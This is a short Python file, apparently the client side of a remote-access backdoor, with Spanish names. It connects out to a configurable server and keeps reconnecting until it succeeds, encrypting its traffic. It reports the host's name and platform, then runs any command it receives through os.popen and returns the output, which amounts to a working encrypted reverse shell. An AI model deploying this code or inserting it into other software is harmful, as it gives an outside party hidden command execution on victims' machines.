import socket, platform, os
from time import sleep
from components.criptografia import cifrar, descifrar, gen_key

class Clientes:

    nombre = socket.gethostname()
    puerto = ''
    plataforma = platform.platform()
    conn_timeout = 5
    conectado = False
    key = gen_key()

    def __init__(self, address, port):
        self.servidor = address
        self.puerto = port
        self.reconectar()
    
    def obtener_info(self):
        informacion = [ 'Nombre: ' + self.nombre, 'Plataforma: ' + self.plataforma ]
        return '\n'.join(informacion)
    
    def reconectar(self):
        while not self.conectado:
            self.s = socket.socket()
            try:
                self.s.connect((self.servidor, self.puerto))
                self.conectado = True
                self.s.send(cifrar(bytes(self.plataforma[:3], 'utf-8'), self.key))
            except socket.error:
                sleep(self.conn_timeout)

    def conexion(self):
        while True:
            resultado = ''
            data = descifrar(self.s.recv(4096), self.key).decode('utf-8')
            #print(data)
            cmd, _, script = data.partition(' ')
            if cmd == 'quit':
                self.s.shutdown(socket.SHUT_RDWR)
                self.s.close()
                exit()
            elif cmd == 'info':
                resultado = self.obtener_info()
                #print(resultado)
            else:
                resultado = os.popen(data).read()
            
            self.s.send(cifrar(bytes(resultado, 'utf-8'), self.key))